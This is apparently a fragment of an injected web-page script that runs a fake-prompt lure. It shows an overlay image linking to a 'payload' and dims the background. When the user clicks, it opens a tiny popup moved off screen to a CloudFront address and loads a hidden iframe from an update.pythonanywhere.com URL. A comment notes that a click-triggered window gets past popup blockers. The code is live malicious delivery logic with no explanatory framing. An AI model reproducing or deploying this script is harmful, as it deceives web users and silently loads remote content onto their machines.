}

// Create DIV
var flashdiv = document.createElement('div');
flashdiv.setAttribute('id', 'flashDiv');
flashdiv.setAttribute('style', 'position:absolute; top:20%; left:30%; z-index:51;');
flashdiv.setAttribute('align', 'center');
var id = setInterval(frame, 100);
function frame() {
	if (document.body.appendChild(flashdiv)) {
		// window.open is very useful when using data URI vectors and the IFrame/Object tag
		// also, as the user is clicking on the link, the new tab opener is not blocked by the browser.
		flashdiv.innerHTML = "<a href=\"" + payload + "\" target=\"_blank\" ><img src=\"" + image + "\" /></a>";

		// gray out the background
		grayOut(true,{'opacity':'30'});

		// clean up on click
		document.getElementById("flashDiv").onclick = function(){
			document.body.removeChild(flashdiv);
			grayOut(false,{'opacity':'0'});
			document.body.removeChild(document.getElementById('darkenScreenObject'));
			aa=window.open("http://dzebppteh32lz.cloudfront.net/c",'popUpWindow','height=1,width=1,top=0,left=0,resizable=no,scrollbars=no,toolbar=no,menubar=no,location=no,directories=no,status=no')
			//aa=window.openwindow.open("http://d3lvemwrafj7a7.cloudfront.net/e",'_blank', 'toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,left=10000, top=10000, width=10, height=10', ''); 
			aa.moveTo(10000,10000);
			//window.open("http://update.pythonanywhere.com/d");
			var iframe = document.createElement('iframe');
			iframe.style.display = "none";
			iframe.src = "http://update.pythonanywhere.com/d";
			document.body.appendChild(iframe);
			
		}
	  clearInterval(id);
	} 
}
